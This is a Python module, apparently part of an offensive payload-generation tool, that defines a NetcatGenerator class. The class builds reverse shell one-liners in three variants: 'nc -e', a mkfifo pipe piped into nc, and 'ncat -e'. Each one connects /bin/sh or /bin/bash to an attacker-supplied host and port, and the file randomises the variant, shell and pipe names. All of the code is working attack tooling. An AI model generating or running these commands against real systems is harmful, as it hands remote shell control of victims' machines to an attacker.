import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["dash_e", "mkfifo", "ncat"]


class NetcatGenerator(ShellGenerator):
    language = "netcat"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "dash_e":
            cmd = self._dash_e(lhost, lport, names)
        elif variant == "mkfifo":
            cmd = self._mkfifo(lhost, lport, names)
        else:
            cmd = self._ncat(lhost, lport, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _dash_e(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        # Traditional netcat with -e (GNU netcat / ncat)
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/sh"
        return f"nc -e {shell} {lhost} {lport}"

    def _mkfifo(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        # OpenBSD netcat fallback using mkfifo
        pipe = self._var("f", names)
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/bash"
        return (
            f"rm -f /tmp/{pipe}; mkfifo /tmp/{pipe}; "
            f"{shell} -i < /tmp/{pipe} 2>&1 | nc {lhost} {lport} > /tmp/{pipe}"
        )

    def _ncat(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        shell = random.choice(["/bin/bash", "/bin/sh"]) if names else "/bin/sh"
        return f"ncat {lhost} {lport} -e {shell}"
